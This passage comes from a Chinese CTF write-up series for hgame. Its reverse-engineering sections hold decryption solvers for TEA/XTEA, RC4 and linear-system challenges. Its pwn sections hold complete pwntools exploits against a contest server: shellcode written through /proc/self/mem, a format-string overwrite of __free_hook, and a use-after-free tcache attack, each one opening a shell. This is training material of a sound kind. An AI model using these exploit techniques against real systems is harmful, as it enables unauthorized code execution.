    if s.check() == sat:
        model = s.model()
        print(model)
        # for i in range(0x1c):
        #   print(model[flag[i]])
        # str = [chr(model[flag[i]].as_long().real) for i in range(32)]
        # print("".join(str))
        exit()
    else:
        print("unsat")
# Z3()
flag = {'x9':99,
 'x8':108,
 'x14':116,
 'x15':111,
 'x27':0,
 'x18':115,
 'x22':48,
 'x0':104,
 'x3':109,
 'x7':101,
 'x13':95,
 'x23':114,
 'x11':109,
 'x20':95,
 'x1':103,
 'x10':48,
 'x16':95,
 'x25':100,
 'x21':119,
 'x26':125,
 'x6':119,
 'x2':97,
 'x19':109,
 'x12':101,
 'x24':108,
 'x17':52,
 'x4':101,
 'x5':123}
for i in range(0x1c-1):
  s = 'x%d'%i
  print(chr(flag.get(s)),end='')

 
```
## RE -> creakme(魔改tea)
参考官方WP，需要注意用python实现解密算法的时候，移位和数据溢出的问题
### exp
```python
from ctypes import *

def dec(v,k):
    for i in range(0,8,2):
        v0 = c_uint32(v[i]& 0xffffffff)
        v1 = c_uint32(v[i + 1]& 0xffffffff)
        v7 = 32;
        v3 = c_uint32((0x12345678 * 32)& 0xffffffff) 

        print(i,hex(v3.value))
        while ( v7 ):
            v1.value -= (v3.value ^ (v3.value + v0.value) ^ (k[0] + v0.value*16) ^ (k[1] + (v0.value >> 5)))
            v0.value -= (v3.value ^ (v3.value + v1.value) ^ (k[2] + v1.value*16) ^ (k[3] + (v1.value >> 5)))
            v3.value -= 0x12345678
            print(hex(v1.value))
            v7 -= 1
        v3.value = 0
        v[i] = v0.value&0xffffffff
        v[i + 1] = v1.value& 0xffffffff
    return v

# v = [0xED9CE5ED52EB78C2030C144C48D93488,0x65E0F2E3CF9284AABA5A126DAE1FEDE6,,,]
v = [0x48D93488,0x030C144C,0x52EB78C2,0xED9CE5ED,0xAE1FEDE6,0xBA5A126D,0xCF9284AA,0x65E0F2E3]
# k = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/='
k = [0x44434241,0x48474645,0x4c4b4a49,0x504f4e4d]

flaglist = dec(v,k)
# flaglist = [0x6d616768,0x34487b65,0x5f797070,0x34633476,0x6e306974,0x7d21]

# # WOW 
# flagwow = [0x6D616768,0x4F577B65,0x5F574F57,0x70704068,0x336E5F79,0x65795F77,0x325F7234,0x7D323230]
print (flaglist)
for i in flaglist:
    print (chr(i&0xff),end='')
    print (chr(i>>8&0xff),end='')
    print (chr(i>>16&0xff),end='')
    print (chr(i>>24&0xff),end='')
    print (chr(i>>32&0xff),end='')
# 注意python和c的区别，当有溢出时 <<4 并不等于 *16


```
## RE -> flagchecker(base64、RC4)
简单的安卓逆向，参考官方WP
### exp
```python
import sys
import base64
from Crypto.Cipher import  ARC4

class rc4util():
    def __init__(self,key):
        if isinstance(key,str):
            self.__keyGen = key.encode()
        elif isinstance(key,bytes):
            self.__keyGen = key
    def __encrypt(self,data) ->bytes:
        rc4 = ARC4.new( self.__keyGen)
        res = rc4.encrypt(data)
        res = base64.b64encode(res)
        return res
    def __decrypt(self,data)->bytes:
        rc4 = ARC4.new(self.__keyGen)
        res = base64.b64decode(data)
        res = rc4.decrypt(res)
        return res
    def encrypt(self,src)->bytes:  
        res = self.__encrypt(src)    
        return res
    def decrypt(self,src)->bytes:    
        res = self.__decrypt(src)           
        return res


def Entry(src,key):
    rc4 = rc4util(key)
    bret = rc4.encrypt(src)

    if bret:
        print("加密成功:",bret)
    else:
        print("加密失败")


def Decry(src,key):
    rc4 = rc4util(key)
    bret = rc4.decrypt(src)
    if bret:
        print("解密成功:",bret)
    else:
        print("解密失败")

if __name__ == "__main__":
    key = b'carol'
    src = b"xxxsrcFile"  #这里是读取src文件数据,然后对其进行加密.加密的结果写入到dst文件中
    encstr = b"mg6CITV6GEaFDTYnObFmENOAVjKcQmGncF90WhqvCFyhhsyqq1s="
    Entry(src,key)
    Decry(encstr,key)
```
## RE -> 猫头鹰不是猫(求解非齐次线性方程组)
根据提示知道他是线代里面的求解非齐次线性方程组，python中linalg、numpy可以求解，详细参考官方WP
### exp
```python
# -*- coding: utf-8 -*-
from scipy import linalg
import numpy as np
import math
from z3 import *
import time
cmp_data =[0x25D15D4,0x24C73B4,0x243CF71,0x230134C,
    0x2132CFE,0x1BE2FCA,0x142CA26,0x0D61955,
    0x9427A8,0x9B8674,0x90C832,0x8812C7,
    0x80BA58,0x7981E1,0x72AB68,0x74CB4B,
    0x723F3F,0x7CC258,0x89CD5C,0x88E2A2,
    0x8E8906,0x8B88A0,0x8EEC8D,0x8F3573,
    0x8B746F,0x912C82,0x8D7CF2,0x832099,
    0x7F45A5,0x685AFF,0x50A4D2,0x526FE2,
    0x58923B,0x529EC1,0x516D1A,0x5B7453,
    0x7028E6,0x89C6FA,0x0A5D6AE,0x0D37A14,
    0x0B8CFAA,0x0B0BB4B,0x0AE69A4,0x0A1154B,
    0x9DCBE7,0x0A1DC20,0x0AA07E3,0x0B25CB1,
    0x0B2FD98,0x0B12F29,0x0E428A0,0x11B2184,
    0x1615722,0x1A502F3,0x1C0AA9D,0x1D4169F,
    0x1EF8B76,0x233E5BB,0x275A6F0,0x2A9CA35,
    0x2A8904C,0x2A194EF,0x2926F39,0x28E92C3
]
    
# print (len(cmp_data))
def hexstr2hex(hexstr):
    hexstr = hexstr[2:]
    return int(hexstr,16)

# export_results.txt
def openfile(name):
    with open(name,'r') as f:
        data = f.read()
    data = data.replace('\r','').replace('\n','').replace(' ','').split(',')
    # print(data)
    for i in range(len(data)):
        data[i] = hexstr2hex(data[i])
    tmp = []
    for i in range(0,len(data),4):
        tmp.append(data[i])
    return tmp
data1 = openfile('export_results.txt')
data2 = openfile('export_results1.txt')
print (len(data1),len(data2))

def makeresult(data):

    v9 = [0]*64
    for i in range(64):
        v3 = []
        for j in range(64):
             v3.append(data[((j<<6))+i]) 
        v9[i] = v3
        # print(v3)
    return v9
# print list(openfile('export_results.txt'))


def solvere():
    
    x_temp1 =  makeresult(data1)
    x_temp2 =  makeresult(data2)
    x_temp2=np.array(x_temp2)#转换为矩阵形式
    x_temp1=np.array(x_temp1)#转换为矩阵形式
    # print(type(x_temp1))
    #X_temp代表系数矩阵
    # C=[54,44,55]#C为常数列
    C = np.array(cmp_data)  # b代表常数列
    # round 1 
    X = linalg.solve(x_temp2,C)
    # round 2
    X = linalg.solve(x_temp1,X)
    for i in X:
        print(chr(int(round(i))),end='')

    
solvere()
# hgame{100011100000110000100000000110001010110000100010011001111}

```
# week2
## PWN -> blind (proc文件系统)
### 描述
    看不见此题的描述
    attachment
    题目地址 
    nc chuj.top 51622

    基准分数 150
### 分析
题目没有附件，只给了nc端口，连上去发现可以打开一个文件，之后写入数据：
```bash
'This time you need to perform a blind attack'
[DEBUG] Received 0x8c bytes:
    '\n'
    'I will give you a gift: the address of the function write: 0x7f31cf3bd210\n'
    'you can now open a file(no flag!), input the full path of it:\n'
    '>> '
[+] writeptr: 0x7f31cf3bd210
[+] libcbase: 0x7f31cf2ad000
[+] __libc_start_main: 0x7f31cf2ceb10
[DEBUG] Sent 0x10 bytes:
    00000000  2f 70 72 6f  63 2f 73 65  6c 66 2f 6d  65 6d 00 0a  │/pro│c/se│lf/m│em··│
    00000010
[DEBUG] Received 0x2b bytes:
    'now, input the place you want to write:\n'
    '>> '
```
给了write的地址，可以得到libc_start_main地址，确定远程环境是libc2.27，然后覆盖libc_start_main处的代码为shellcode然后拿到shell。此题目和proc文件系统有关系。

Linux系统上的/proc目录是一种文件系统，即proc文件系统。与其它常见的文件系统不同的是，/proc是一种伪文件系统（也即虚拟文件系 统），存储的是当前内核运行状态的一系列特殊文件，用户可以通过这些文件查看有关系统硬件及当前正在运行进程的信息，甚至可以通过更改其中某些文件来改变 内核的运行状态。

1. environ — 当前进程的环境变量列表，彼此间用空字符（NULL）隔开；变量用大写字母表示，其值用小写字母表示；
2. maps — 当前进程关联到的每个可执行文件和库文件在内存中的映射区域及其访问权限所组成的列表；
3. mem — 当前进程所占用的内存空间，由open、read和lseek等系统调用使用，不能被用户读取；需要结合maps的映射信息来确定读的偏移值。

### exp
```python
from pwn import *

remote_addr=['chuj.top',51622] #chuj.top 51622
context.terminal = ["/bin/tmux", "sp","-h"]
context.log_level=True
context.arch = 'amd64' 
context.os = 'linux'
io=remote(remote_addr[0],remote_addr[1])
# elf_path = "./echo"
# io = process(elf_path)
local = False

libc = ELF("./libc-2.27.so")
# libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
# elf = ELF(elf_path)

#gdb.attach(p, 'c')


l64 = lambda      :u64(io.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
l32 = lambda      :u32(io.recvuntil("\x7f")[-4:].ljust(4,"\x00"))
rl = lambda	a=False		: io.recvline(a)
ru = lambda a,b=True	: io.recvuntil(a,b)
rn = lambda x			: io.recvn(x)
sn = lambda x			: io.send(x)
sl = lambda x			: io.sendline(x)
sa = lambda a,b			: io.sendafter(a,b)
sla = lambda a,b		: io.sendlineafter(a,b)
irt = lambda			: io.interactive()
dbg = lambda text=None  : gdb.attach(io, text)
lg = lambda s			: log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
lgs = lambda s			: log.info('\033[1;31;40m %s --> %s \033[0m' % (s, eval(s)))
uu32 = lambda data		: u32(data.ljust(4, '\x00'))
uu64 = lambda data		: u64(data.ljust(8, '\x00'))
ur64 = lambda data		: u64(data.rjust(8, '\x00'))


def lg(s,addr = None):
    if addr:
        print('\033[1;31;40m[+]  %-15s  --> 0x%8x\033[0m'%(s,addr))
    else:
        print('\033[1;32;40m[-]  %-20s \033[0m'%(s))

def raddr(a=6):
    if(a==6):
        return u64(rv(a).ljust(8,'\x00'))
    else:
        return u64(rl().strip('\n').ljust(8,'\x00'))
if local == False:
    ru('sha256(????) == ')
    sha256 = rn(64)
    lgs('sha256')
    import hashlib
    tmpstr = ''
    flag = False
    for i in range(48,127):
        for j in range(48,127):
            for k in range(48,127):
                for n in range(48,127):
                    tmpstr = chr(i)+chr(j)+chr(k)+chr(n)
                    hash=hashlib.sha256()
                    hash.update(bytes(tmpstr))
                    s = hash.hexdigest()
                    if s == sha256:
                        print(tmpstr)
                        flag = True
                        break
                if flag == True:
                    break
            if flag == True:
                break
        if flag == True:
            break


    sla('your ????> ',tmpstr)
ru('write: ')
writeptr = int(io.recvuntil('\n', drop = True), base = 16)
log.success("writeptr: " + hex(writeptr))
libcbase = writeptr - libc.symbols['write']
log.success("libcbase: " + hex(libcbase))
libc_start_main = libcbase + libc.symbols['__libc_start_main']
log.success("__libc_start_main: " + hex(libc_start_main))
sla('path of it:\n>> ','/proc/self/mem\x00')
sla('>> ',str(libc_start_main))
payload = asm(shellcraft.sh()).rjust(0x300, asm('nop')) + '\n'
sla('>> ',payload)
irt()
```
## PWN -> echo_server(fmt读/写、rbp链)
### 描述
    输入什么，输出什么
    attachment
    题目地址 
    nc chuj.top 52319
    基准分数 250
### 分析
此题没开canary，环境libc2.31，其实开了canary也无所谓都可以泄露出来。查看代码发现有一个格式化字符串漏洞。
```c
void __noreturn vuln()
{
  int v0; // [rsp+Ch] [rbp-14h] BYREF
  void *ptr; // [rsp+10h] [rbp-10h]
  unsigned __int64 v2; // [rsp+18h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  for ( ptr = 0LL; ; printf((const char *)ptr) )
  {
    do
    {
      printf("your content's length:\n>> ");
      __isoc99_scanf("%d", &v0);
      ptr = realloc(ptr, v0);
    }
    while ( !v0 );
    read(0, ptr, v0);
  }
}
```
一个死循环，没有返回，利用fmt可以泄露栈内容，注意，这里是ptr是堆上的地址，所以是堆上的fmt，如何劫持执行流呢？最简单的就是往栈上写free_hook,改free_hook为system。这里用到三级指针，和二级指针的配合，一个修改写入的偏移，一个实现写入。此处用rbp链：
```bash
00:0000│ rsp 0x7fffffffd890 —▸ 0x7fffffffd8b0 —▸ 0x7fffffffd8c0 ◂— 0x0                     <--------write offset
01:0008│     0x7fffffffd898 ◂— 0x100555550e0
02:0010│     0x7fffffffd8a0 —▸ 0x5555555592a0 ◂— 0xa /* '\n' */
03:0018│     0x7fffffffd8a8 ◂— 0x8b62540d79bc0b00
04:0020│ rbp 0x7fffffffd8b0 —▸ 0x7fffffffd8c0 ◂— 0x0                                        <-------write 
05:0028│     0x7fffffffd8b8 —▸ 0x5555555552c2 (main+28) ◂— mov    eax, 0
06:0030│     0x7fffffffd8c0 ◂— 0x0
07:0038│     0x7fffffffd8c8 —▸ 0x7ffff7de1083 (__libc_start_main+243) ◂— mov    edi, eax
```
可用的三级指针其实还有指向程序名字的地址，但是试了这个在修改freehook的时候会出现异常，原因是printf过程中调用了freehook，而freehhook被我们修改成非法地址了，但是同样的方法在rbp链就可以实现，莫名其妙。此题是个死循环，rbp和ret地址都对程序没有影响，所以可以选择rbp链来写入freehook，然后再修改freehook为system，最后用realloc(0)来触发getshell。涉及到realloc的分配机制，参考[ctfwiki](),在这道题，应保持realloc的size一样，就不会申请其他chunk，最后realloc(0),相当于free。
**利用过程：**
1. 修改三级指针，使得rbp指向libc_start_main
2. 修改libc_start_main为freehook
3. 修改freehook为system
4. getshell

### exp
```python
from pwn import *

remote_addr=['chuj.top',52319] # 23333 for ubuntu16, 23334 for 18, 23335 for 19
context.terminal = ["/bin/tmux", "sp","-h"]
context.log_level=True
io=remote(remote_addr[0],remote_addr[1])
elf_path = "./echo"
# io = process(elf_path)
local = False
libc = ELF("./libc-2.31.so")
# libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
elf = ELF(elf_path)

#gdb.attach(p, 'c')


l64 = lambda      :u64(io.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
l32 = lambda      :u32(io.recvuntil("\x7f")[-4:].ljust(4,"\x00"))
rl = lambda	a=False		: io.recvline(a)
ru = lambda a,b=True	: io.recvuntil(a,b)
rn = lambda x			: io.recvn(x)
sn = lambda x			: io.send(x)
sl = lambda x			: io.sendline(x)
sa = lambda a,b			: io.sendafter(a,b)
sla = lambda a,b		: io.sendlineafter(a,b)
irt = lambda			: io.interactive()
dbg = lambda text=None  : gdb.attach(io, text)
lg = lambda s			: log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
lgs = lambda s			: log.info('\033[1;31;40m %s --> %s \033[0m' % (s, eval(s)))
uu32 = lambda data		: u32(data.ljust(4, '\x00'))
uu64 = lambda data		: u64(data.ljust(8, '\x00'))
ur64 = lambda data		: u64(data.rjust(8, '\x00'))


def lg(s,addr = None):
    if addr:
        print('\033[1;31;40m[+]  %-15s  --> 0x%8x\033[0m'%(s,addr))
    else:
        print('\033[1;32;40m[-]  %-20s \033[0m'%(s))

def raddr(a=6):
    if(a==6):
        return u64(rv(a).ljust(8,'\x00'))
    else:
        return u64(rl().strip('\n').ljust(8,'\x00'))



if local == False:
    ru('sha256(????) == ')
    sha256 = rn(64)
    lgs('sha256')
    import hashlib
    tmpstr = ''
    flag = False
    for i in range(48,127):
        for j in range(48,127):
            for k in range(48,127):
                for n in range(48,127):
                    tmpstr = chr(i)+chr(j)+chr(k)+chr(n)
                    hash=hashlib.sha256()
                    hash.update(bytes(tmpstr))
                    s = hash.hexdigest()
                    if s == sha256:
                        print(tmpstr)
                        flag = True
                        break
                if flag == True:
                    break
            if flag == True:
                break
        if flag == True:
            break


    sa('your ????> ',tmpstr)
def fmt(data,offset):
    pay = "%"+str(data)+"s%"+str(offset)+"$hn\x00"
    sla('>> ',str(256))
    sn(pay)

def fmt1(data,offset):
    pay = "%"+str(data)+"s%"+str(offset)+"$hhn\x00"
    sla('>> ',str(256))
    sn(pay)

sla('>> ',str(256))
sl('%8$p##%9$p#%10$p@%13$p*%11$p*%15$s')
heapbase = int(ru('##'),16) 
lg('heapbase',heapbase)
canary = int(ru('#'),16)
lg('canary',canary)
rbp = int(ru('@'),16) 
lg('rbp',rbp)
printret = rbp - 0x38 
lg('printret',printret)
libcbase = int(ru('*'),16)-libc.symbols['__libc_start_main']-243
lg('libcbase',libcbase)
system = libcbase + libc.symbols['system']
lg('system',system)
binsh = libcbase + libc.search('/bin/sh').next()
lg('binsh',binsh)
freehook = libcbase + libc.symbols['__free_hook']
lg('freehook',freehook)
stdin = libcbase + libc.symbols['_IO_2_1_stdin_']
lg('stdin',stdin)
io_buf_base = stdin + 8*7
lg('io_buf_base',io_buf_base)
mallochook = libcbase + libc.symbols['__malloc_hook']
lg('mallochook',mallochook)
pro = int(ru('*'),16)-0x12c2
lg('pro',pro)
stack = rbp + 8 
fmt1((stack+2)&0xff,6)
fmt((freehook>>16)&0xffff,10)
fmt1(stack&0xff,6)
fmt((freehook)&0xffff,10)

fmt((system)&0xffff,13)
fmt((freehook+2)&0xffff,10)
fmt((system>>16)&0xffff,13)
fmt((freehook+4)&0xffff,10)
fmt((system>>32)&0xffff,13)
sla('>> ',str(256))
sl('/bin/sh\x00')
# dbg()
sla('>> ',str(0))

irt()

# hgame{I~H@TE_FMT-eXpLO!t:(~So~THErE_Will_BE~nO_MorE}
```
**注：**
格式化写入的时候最好2字节写入，不行再尝试单字节写入。

## PWN -> oldfashion_note (UAF、libc2.31)
### 描述
    很 ctf 的 ctf 题
    attachment
    题目地址 
    nc chuj.top 51505

    基准分数 200
### 分析
环境libc2.31、保护全开，程序delete功能有UAF，可以泄露地址，然后修改freehook为system，getshell，利用过程需要绕过tcache。
### exp
```python
# -*- coding: UTF-8 -*-
import hashlib
from pwn import *

context.log_level = 'debug'
context.terminal = ["/usr/bin/tmux","sp","-h"]
local = False
io = remote('chuj.top', 51505) # chuj.top 51505
libc = ELF('./libc-2.31.so')
# io = process('note')
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

l64 = lambda      :u64(io.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
l32 = lambda      :u32(io.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
rl = lambda	a=False		: io.recvline(a)
ru = lambda a,b=True	: io.recvuntil(a,b)
rn = lambda x			: io.recvn(x)
sn = lambda x			: io.send(x)
sl = lambda x			: io.sendline(x)
sa = lambda a,b			: io.sendafter(a,b)
sla = lambda a,b		: io.sendlineafter(a,b)
irt = lambda			: io.interactive()
dbg = lambda text=None  : gdb.attach(io, text)
lg = lambda s			: log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
lgs = lambda s			: log.info('\033[1;31;40m %s --> %s \033[0m' % (s, eval(s)))
uu32 = lambda data		: u32(data.ljust(4, '\x00'))
uu64 = lambda data		: u64(data.ljust(8, '\x00'))
ur64 = lambda data		: u64(data.rjust(8, '\x00'))
def add(idx,size,content):
	sl('1')
	sa('index?\n>> ',str(idx))
	sa('size?\n>> ',str(size))
	sa('content?\n>> ',content)
def show(idx):
	sl('2')
	sla('index?\n>> ',str(idx))
		
def delete(idx):
	sl('3')
	sla('index?\n>> ',str(idx))

def exit(idx):
	sl('4')

if local == False:
    ru('sha256(????) == ')
    sha256 = rn(64)
    lgs('sha256')
    import hashlib
    tmpstr = ''
    flag = False
    for i in range(48,127):
        for j in range(48,127):
            for k in range(48,127):
                for n in range(48,127):
                    tmpstr = chr(i)+chr(j)+chr(k)+chr(n)
                    hash=hashlib.sha256()
                    hash.update(bytes(tmpstr))
                    s = hash.hexdigest()
                    if s == sha256:
                        print(tmpstr)
                        flag = True
                        break
                if flag == True:
                    break
            if flag == True:
                break
        if flag == True:
            break


    sa('your ????> ',tmpstr)

for i in range(8): # 0-7
    add(i,0xf0,str(i))
add(8,0xf0,str(8)) # 8
for i in range(8): 
    delete(i)
show(7)
libcbase  = l64() - 0x1ebbe0
lg('libcbase')
freehook = libcbase + libc.sym['__free_hook']
system = libcbase + libc.sym['system']
binsh = libcbase + libc.search('/bin/sh').next()
lg('freehook')
lg('system')
lg('binsh')


for i in range(8):  # 0-7
    add(i,0x10,str(i))
add(9,0x10,str(9))
add(10,0x10,str(10))
for i in range(8): # 7
    delete(i)
delete(9)
delete(7)
for i in range(7):  # 0-7
    add(i,0x10,str(i))

# dbg()
add(7,0x10,p64(freehook)*2)
add(9,0x10,'/bin/sh\00')
add(10,0x10,'/bin/sh\00')
add(11,0x10,p64(system))

delete(9)

irt()
```

## RE ->creakme2 (魔改xtea、SEH隐藏关键逻辑)
程序是一个魔改的xtea，但是魔改的比较隐蔽，需要通过看汇编才能看出，程序通过try....except隐藏了算法的关键处理逻辑，从汇编看这是一个sar逻辑右移(以符号位填充)操作
```asm
.text:0000000140001112 ;   __try { // __except at loc_140001150
.text:0000000140001112 ;     __try { // __except at loc_140001141
.text:0000000140001112                 mov     eax, cs:dword_140003034
.text:0000000140001118                 mov     ecx, [rsp+58h+var_38]
.text:000000014000111C                 add     ecx, eax
.text:000000014000111E                 mov     eax, ecx
.text:0000000140001120                 mov     [rsp+58h+var_38], eax
.text:0000000140001124                 mov     eax, [rsp+58h+var_38]
.text:0000000140001128                 sar     eax, 1Fh
.text:000000014000112B                 mov     [rsp+58h+var_28], eax
.text:000000014000112F                 mov     eax, 1
.text:0000000140001134                 cdq
.text:0000000140001135                 mov     ecx, [rsp+58h+var_28]
.text:0000000140001139                 idiv    ecx
.text:000000014000113B                 mov     [rsp+58h+var_1C], eax
.text:000000014000113F                 jmp     short loc_14000114E
.text:000000014000113F ;     } // starts at 140001112
```
通过调试发现他就是判断了sar 31；后符号位是1还是0，如果是0的话就跳转到sum^=0x1234567,否则不异或，其实是SEH 异常处理程序，使用 SEH 隐藏了程序的关键，执行逻辑还原代码就是
```c
__try { 
    __try { 
        sum += delta; 
        a=1 / (sum >> 31); 
    }__except (FilterFuncofDBZ(GetExceptionCode())) { 
        sum ^= 0x1234567; 
    } 
}__except (FilterFuncofOF(GetExceptionCode())) { 
    sum = 0x9E3779B1; 
}
```
### exp
```c
#include<stdio.h>
#include <stdint.h> 
int main(int argc, const char** argv, const char** envp)
{
    int v3; // edx
    int i; // esi
    unsigned int v0; // edi
    unsigned int v1; // ebx
    int v7; // esi
    int v8; // esi
    int v13; // [esp+90h] [ebp-8h]
    int v14; // [esp+94h] [ebp-4h]

    //65E0F2E3CF9284AABA5A126DAE1FEDE6 ED9CE5ED52EB78C2030C144C48D93488
#if 1
    uint32_t  ida_chars[8] =
    { 
     0x457E62CF, 0x9537896C,0x1F7E7F72,0xF7A073D8,0x8E996868,0x40AFAF99, 0x0F990E34, 0x196F4086
     //0x196F4086,0x0F990E34,0x40AFAF99,0x8E996868,0x0F7A073D8,0x1F7E7F72,0x9537896C, 0x457E62CF
        
    };
#endif
#if 0
     uint32_t  ida_chars[8] =
    {
        0x31313131,0x31313131,0x31313131,0x31313131,0x31313131,0x31313131,0x31313131,0x31313131
        //0x8EFD25F5, 0x0ADBCBA4F, 0x8EFD25F5, 0x0ADBCBA4F, 0x8EFD25F5,0x0ADBCBA4F,0x8EFD25F5,0x0ADBCBA4F
    };
 #endif
    uint32_t k[10] =
    { 0x1, 0x2, 0x3, 0x4,0x5, 0x6, 0x7, 0x8,0x9,0x0
    };
    v3 = 0;
    v14 = 0;
    for (i = 0; i < 8; v14 = i)
    {
        v0 = ida_chars[i];
        v1 = ida_chars[i + 1];
        v13 = 0;
        v7 = 32;
#if 1
        v3 = 0xc78e4d05 & 0xffffffff;
        //printf("%x\n", v3);
        for (int j = 0; j < 32; ++j) {
            v1 -= (v3 + k[((v3 >> 11) | 0xffe00000) & 3]) ^ (v0 + ((v0 << 4) ^ (v0 >> 5)));
            uint32_t ss;
            ss = (v3 >> 0x1f);
            if (!ss) {
                v3 ^= 0x1234567;
            }
            v3 -= 0x9E3779B1;

            v0 -= (v3 + k[v3 & 3]) ^ (v1 + ((v1 << 4) ^ (v1 >> 5)));
            //  printf("%x\n", v1);
        }

#endif // 0
#if 0
        do
        {
            v0 += (v3 + k[v3 & 3]) ^ (v1 + (( v1<<4) ^ (v1 >> 5)));
            v3 += 0x9E3779B1;
            uint32_t ss;
            ss = (v3 >> 0x1f);
            if (!ss) {
                v3 ^= 0x1234567;
            }
           
            //printf("%x\n", v3);
            v1 += (v3 + k[((v3 >> 11)| 0xffe00000) & 3]) ^ (v0 + ((v0<<4) ^ (v0 >> 5)));
            --v7;
        } while (v7);
#endif
        printf("%x\n", v3);
        v8 = v14;
        v3 = 0;
        ida_chars[v14] = v0 & 0xffffffff;
        ida_chars[v8 + 1] = v1 & 0xffffffff;
        i = v8 + 2;
    }
    for (int i = 0; i < 8; i++) {
         printf("%x\n", ida_chars[i]);
    }
    return 0;
}
//hgame{SEH_s0und5_50_1ntere5ting}
```
## RE -> faskshell (RC4)
简单的异或，参考官方WP
### exp
调试过程，拿到关键数据，只有一个异或。其实出题人想考的是RC4加密
```python
# data = [    
#     0x0e,0x0b,0x00,0x0a,0x45,0x12,0x00,0x10,
#     0x19,0x0D,0x11,0x48,0x41,0x0F,0x14,0x2C,
#     0x05,0x1a,0x1c,0x3b,0x42,0x1c,0x09,0x45,
#     0x52,0x3a,0x03,0x40,0x0c,0x1c,0x5a,0x19,
#     0x2e,0x68
# ]

v9 = [
    0xb6,0x94,0xfa,0x8f,0x3d,0x5f,0xb2,0xe0,
    0xea,0x0f,0xd2,0x66,0x98,0x6c,0x9d,0xe7,
    0x1b,0x08,0x40,0x71,0xc5,0xbe,0x6f,0x6d,
    0x7c,0x7b,0x09,0x8d,0xa8,0xbd,0xf3,0xf6
]

tmp = [
    0xde,0xf3,0x9b,0xe2,0x58,0x24,0xc1,0xd0,
    0x87,0x6a,0xa6,0x0e,0xa9,0x02,0xfa,0xb8,
    0x69,0x7d,0x2e,0x2e,0xa7,0xdb,0x09,0x5d,
    0x0e,0x24,0x64,0xb9,0xc1,0xd3,0xcc,0x8b
]
for i in range(32):
    print(chr(tmp[i]^v9[i]),end='')
# hgame{s0meth1ng_run_bef0r_m4in?}
```
## RE -> maze(迷宫)
迷宫题
### exp
```python
o = [
  0x20, 0x20, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x20, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x20, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
  0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 
